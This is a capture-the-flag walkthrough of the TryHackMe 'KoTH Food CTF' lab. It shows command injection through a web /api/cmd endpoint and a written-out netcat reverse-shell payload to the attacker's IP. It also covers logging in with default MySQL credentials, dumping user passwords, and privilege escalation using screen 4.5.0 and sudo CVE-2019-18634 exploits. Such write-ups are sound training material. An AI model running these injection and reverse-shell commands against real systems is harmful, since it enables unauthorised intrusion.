---
layout: post
title: "KoTH Food CTF"
date: 2022-10-20
categories: [Tryhackme, Easy-THM]
tags: [dirsearch, Command-Injection, CVE-2019-18634]
image: ../../assets/img/posts/kothfoodctf.png 

---

## Description

Practice Food KoTH alone, to get familiar with KoTH!

|**Room**|[KoTH Food CTF](https://tryhackme.com/room/kothfoodctf)|
|:---:|:---:|
|**OS**|Linux|
|**Difficulty**|Easy|
|**Creator**|[NinjaJc01](https://tryhackme.com/p/NinjaJc01)|

---

Deploy the machine and quickly scan the ports with rustscan,

```bash
rustscan -a 10.10.20.53 --ulimit 5000
```

![image](https://user-images.githubusercontent.com/67465230/186400331-158cb2b2-c531-4ce5-82c7-51ccfebf1190.png)

5 ports are open with port 22 running ssh service, port 3306 is running mysql service, port 9999 is running something and 15065,16109 is running unknown service. Let's start enumerating port 15065.

Visit http://10.10.20.53:15065/,

![image](https://user-images.githubusercontent.com/67465230/186400560-1a74a73a-441b-4f5c-9324-7e2482bdcb34.png)

We got message from developers that site is down for maintenance.

We now have to find hidden directories,

```bash
dirsearch -u http://10.10.20.53:15065/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -i 200,301 2>/dev/null
```

![image](https://user-images.githubusercontent.com/67465230/186400645-71276b03-9821-4482-97ad-8ece3dc91cb5.png)

we got a hidden directory /monitor.

Let's visit http://10.10.20.53:15065/monitor/,

![image](https://user-images.githubusercontent.com/67465230/187595474-e576f16e-5eaf-4f7c-9efa-c7b9d2be65a5.png)

So on /monitor, we see a slightly more polished GUI. From a few other challenges, "Ping host" can often be a route for command injection. Let's try chaining commands in the text box.

![image](https://user-images.githubusercontent.com/67465230/186400845-aa68f30e-df0d-4b2f-9d38-500f2b59517d.png)

It not let us in that easily. It's trying to validate the IP address we enter somewhere. Let's check out what it's doing behind the scenes by reading the JS.

![image](https://user-images.githubusercontent.com/67465230/186400883-a111374d-82f2-4d0a-9436-ec24b2563678.png)

The JS is obfuscated. I don't deobfuscating it. So let's see what it's actually doing if we put in a valid IP address. Opening the browser dev tools, we can track the HTTP requests that the page makes.

![image](https://user-images.githubusercontent.com/67465230/186400941-fa2ba13c-9cf5-4eec-93c9-6523d5568566.png)

Interesting, we can see a POST request to /api/cmd with the body: "ping -c 4 127.0.0.1". That implies that the command is being formed clientside, let's try running our own commands with cURL!

Now, using curl tool, we are going to return the directory enumeration through our request,

```bash
curl 10.10.20.53:15065/api/cmd -X POST -d "ls -lah"
```

![image](https://user-images.githubusercontent.com/67465230/186400974-98e98c3d-d771-4a2e-86a0-0610d18fecf3.png)

we can see directories and other files. We have command injection. Let's spawn a quick revshell to get slightly better access to the box. Start a netcat listener using `nc -nvlp 4444`.

Now, issue the request to gain a reverse shell,

```bash
curl 10.10.20.53:15065/api/cmd -X POST -d "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.9.0.152 4444 >/tmp/f"
```

![image](https://user-images.githubusercontent.com/67465230/186401004-d09c7a11-805f-40bd-9661-3dd2de53aa53.png)

We got a shell but we shouldn't stop at one entry point.

Let's explore MySQL next. I wonder if the default creds (root:root for old versions) will work for it...

```bash
mysql -h 10.10.20.53 -u root -p
```

![image](https://user-images.githubusercontent.com/67465230/186401032-319ebb26-09ec-4701-b2eb-0a8f36f20be1.png)

With these command, we can enumerate DB and get the username and password,

```sql
show databases;
use users;
show tables;
select * from User;
```

Now, let's login as ramen user via ssh,

```bash
ssh ramen@10.10.20.53
```

![image](https://user-images.githubusercontent.com/67465230/186401075-f752abaa-03c1-43fc-b0e7-c4b5aaa97fd2.png)

We're in!. Now enumerating permissions randomly, we notice that we get asterisks when entering our password for sudo. This isn't standard behaviour on Ubuntu. We'll come back to this.

We're running out of ports to look at. Let's try the one that's next up numerically, 16109. Nmap had no idea for this one, let's try curl and see what that does,

```bash
curl 10.10.20.53:16109
```

![image](https://user-images.githubusercontent.com/67465230/186401119-2e37c1b7-8ce6-4e8f-a9fc-90ddcb9b15d1.png)

```bash
curl 10.10.20.53:16109 --output file16109
```

![image](https://user-images.githubusercontent.com/67465230/186401173-3216567e-beeb-4d41-baa5-72fb5c449667.png)

```bash
file file16109
```

![image](https://user-images.githubusercontent.com/67465230/186401227-fbd6b987-0981-482f-bc11-9e8c8aa95c0c.png)

Seeing as we got a warning that it was binary data, we can assume it's serving something interesting. The "file" command tells us it's JPG data.

Let's look at the image and see if that helps,

![image](https://user-images.githubusercontent.com/67465230/186401285-7370313f-e698-48cb-9bce-3e48da0db6f3.png)

Such a nice looking food.

Let's run binwalk on this image,

```bash
binwalk -e 16109.jpg
```

![image](https://user-images.githubusercontent.com/67465230/186401334-58f4e7ea-e006-4311-a318-e1657bb49600.png)

binwalk extracted the data from image.

Reading the file which got extracted using binwalk,

![image](https://user-images.githubusercontent.com/67465230/186401391-c1313bc2-4bba-4d7d-a1d5-41eedd21fa45.png)

we got pasta user password.

Hopping into machine as pasta user via ssh,

```bash
ssh pasta@10.10.20.53
```

![image](https://user-images.githubusercontent.com/67465230/186401447-dba80ebb-2c68-439c-9a40-58911f438d20.png)

We got in.

Now, we will find those binaries which has SUID bit set on them,

```bash
find / -perm -04000 -type f 2>/dev/null
```

![image](https://user-images.githubusercontent.com/67465230/186401509-efeb5430-1d74-4095-8c99-f04b1f2256d5.png)

We have some unusual SUID binaries there. "/usr/bin/screen-4.5.0" implies that it was installed manually rather than with apt. /usr/bin/vim.basic" is also probably interesting. 

Searching exploitdb, we find [41154](https://www.exploit-db.com/exploits/41154) so let's download and transfer this and run it,

![image](https://user-images.githubusercontent.com/67465230/186401573-9d84b503-bcea-48dd-b74f-395a0fd7675f.png)

One more privesc. We noticed earlier that we got asterisks when entering our password for Sudo. There was a recent CVE (2019-18634) that affects sudo when this option is configured. The option is called PWFEEDBACK, and an exploit PoC is available here [Github saleemrashid - Sudo CVE-2019-18634](https://github.com/saleemrashid/sudo-cve-2019-18634.git),

![image](https://user-images.githubusercontent.com/67465230/186401621-58dbcf41-7c50-4155-b280-5d25a2f489cd.png)

Now, start a server using `python3 -m http.server`and transfer this file, make it executable using `chmod +x exploit` and run it,

![image](https://user-images.githubusercontent.com/67465230/186402228-89ebfa36-d00e-49b9-90b0-5eaa2861705c.png)

We are root.